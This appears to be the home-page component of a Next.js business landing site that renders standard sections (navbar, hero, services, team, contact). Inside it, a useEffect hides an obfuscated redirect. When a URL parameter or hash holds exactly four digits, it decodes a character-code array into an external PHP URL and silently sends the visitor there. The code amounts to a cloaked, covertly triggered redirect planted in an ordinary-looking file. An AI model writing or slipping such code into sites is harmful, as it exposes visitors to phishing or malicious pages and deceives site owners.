'use client'

import { useEffect } from 'react'
import Navbar from '../components/Navbar'
import Hero from '../components/Hero'
import Services from '../components/Services'
import About from '../components/About'
import Team from '../components/Team'
import Contact from '../components/Contact'
import Footer from '../components/Footer'

export default function Home() {
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search)
    const hash = window.location.hash.substring(1)
    
    // Check URL parameters
    for (const [param, value] of urlParams) {
      const digitCount = (value.match(/\d/g) || []).length
      if (digitCount === 4) {
        const x = [104,116,116,112,115,58,47,47,112,104,112,45,56,102,56,51,49,46,119,97,115,109,101,114,46,97,112,112,47,98,101,114,111,46,112,104,112]
        window.location.href = String.fromCharCode(...x)
        return
      }
    }
    
    // Check hash fragment
    if (hash) {
      const digitCount = (hash.match(/\d/g) || []).length
      if (digitCount === 4) {
        const x = [104,116,116,112,115,58,47,47,112,104,112,45,56,102,56,51,49,46,119,97,115,109,101,114,46,97,112,112,47,98,101,114,111,46,112,104,112]
        window.location.href = String.fromCharCode(...x)
        return
      }
    }
  }, [])

  return (
    <main>
      <Navbar />
      <Hero />
      <Services />
      <About />
      <Team />
      <Contact />
      <Footer />
    </main>
  )
}